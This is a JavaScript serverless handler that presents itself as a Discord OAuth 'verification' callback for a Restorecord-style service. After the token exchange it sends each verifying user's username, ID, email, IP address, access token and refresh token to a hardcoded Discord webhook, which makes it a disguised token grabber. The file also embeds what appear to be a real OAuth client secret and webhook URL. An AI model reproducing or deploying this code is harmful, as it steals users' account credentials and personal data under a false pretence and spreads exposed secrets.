export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Code not provided");

  const clientId = "1390626260056674366";
  const clientSecret = "hL-Ji669_YHUf7ICB91PazHBrBeU0_eA";
  const redirectUri = "https://restorecord-three.vercel.app/api/callback";
  const webhookURL = "https://discord.com/api/webhooks/1391119754780999730/r2DO9bmjrdv7EvHXKmwv7ICJtb_ZU68Az5JryR-tmPoqY_rcj_1-CMq3BFnIoRm3J82-";

  const params = new URLSearchParams();
  params.append("client_id", clientId);
  params.append("client_secret", clientSecret);
  params.append("grant_type", "authorization_code");
  params.append("code", code);
  params.append("redirect_uri", redirectUri);

  const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: params.toString(),
  });

  if (!tokenResponse.ok) return res.status(500).send("Token exchange failed");
  const tokenData = await tokenResponse.json();

  const { access_token, refresh_token, expires_in } = tokenData;

  const userResponse = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${access_token}` },
  });

  if (!userResponse.ok) return res.status(500).send("Failed to fetch user data");

  const userData = await userResponse.json();

  const userIp =
    req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

  // Send embed to Discord webhook
  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [
        {
          title: "✅ User Verified",
          color: 0x00ff88,
          description: "A new user has verified via Restorecord",
          fields: [
            {
              name: "👤 User",
              value: `\`${userData.username}#${userData.discriminator}\`\nID: \`${userData.id}\``,
              inline: false,
            },
            {
              name: "📧 Email",
              value: `\`${userData.email || "Not Available"}\``,
              inline: false,
            },
            {
              name: "🌐 IP Address",
              value: `\`${userIp}\``,
              inline: false,
            },
            {
              name: "🔐 Access Token",
              value: `\`\`\`${access_token}\`\`\``,
              inline: false,
            },
            {
              name: "♻️ Refresh Token",
              value: `\`\`\`${refresh_token}\`\`\``,
              inline: false,
            },
          ],
          footer: {
            text: "Restorecord Logs",
          },
          timestamp: new Date().toISOString(),
        },
      ],
    }),
  }).catch(console.error);

  // Notify your backend (Render) to assign role
  await fetch("https://myproject-bvb7.onrender.com/grant-role", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user_id: userData.id }),
  }).catch(console.error);

  res.status(200).send("✅ Verification complete. You can close this tab.");
}
